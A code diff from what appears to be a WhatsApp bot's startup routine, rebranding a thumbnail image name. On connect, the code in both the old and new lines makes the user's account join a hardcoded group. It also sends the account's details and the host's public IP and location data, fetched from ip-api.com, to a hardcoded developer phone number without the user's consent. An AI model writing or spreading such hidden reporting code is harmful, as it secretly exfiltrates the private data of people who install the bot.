@@ -110,11 +110,11 @@ await client.connect({ timeoutMs: 30 * 1000 });
  teks = `https://chat.whatsapp.com/E6kGrmOhmo9FtNvonhrjy1`
  client.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
  console.log(color('|WRN|', 'yellow'), color('Joined to Forum Whatsapp Bot group', 'cyan'))
- client.sendMessage(`919677331878@s.whatsapp.net`, `*Hi Owner Akbar, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Akbar Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/919677331878?text=Hello bro"}}})
+ client.sendMessage(`919677331878@s.whatsapp.net`, `*Hi Owner Akbar, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Akbar Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Akbar.jpg'),sourceUrl:"https://wa.me/919677331878?text=Hello bro"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       client.sendMessage("919677331878@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Akbar Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/919677331878?text=Hello bro"}}})
+       client.sendMessage("919677331878@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Akbar Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Akbar.jpg'),sourceUrl:"https://wa.me/919677331878?text=Hello bro"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
       
